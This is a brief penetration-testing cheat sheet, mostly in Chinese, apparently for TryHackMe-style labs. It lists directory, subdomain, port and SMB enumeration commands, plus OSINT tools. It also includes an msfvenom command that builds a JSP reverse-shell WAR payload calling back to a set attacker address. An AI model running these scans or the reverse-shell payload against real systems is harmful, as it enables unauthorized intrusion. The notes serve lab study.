枚举网站路径
```
feroxbuster -w

dirb -w

gobuster -w -u -X

dirsearch -w -u
```

枚举子域名

```
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u 'http://cmess.thm/' -H "HOST: FUZZ.cmess.thm"
```

全端口快速扫描
```
nmap -T4 -sS -Pn -p-
```

tcp
```
nmap -sCV -sT -Pn -A
```

udp
```
nmap -sCV -sU -Pn -A

```

Smb 服务枚举
```
smbclient -l \\ip
```

```
# 指定用户
smbclient -U qiu \\\\192.168.61.137\\qiu
```


ssh敲门
```
nc -z
```

Msfvenom 制作 payload
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.61.135 LPORT=8888 -f war -o shell.war
```


**There are some specialized tools that we can utilize but for this introduction, it is good to know the following tools.** 

- **Google (specifically Google Dorking)**
- **Wikipedia**
- **PeopleFinder.com**
- **who.is**
- **sublist3r**
- **hunter.io**
- **builtwith.com**
- **wappalyzer**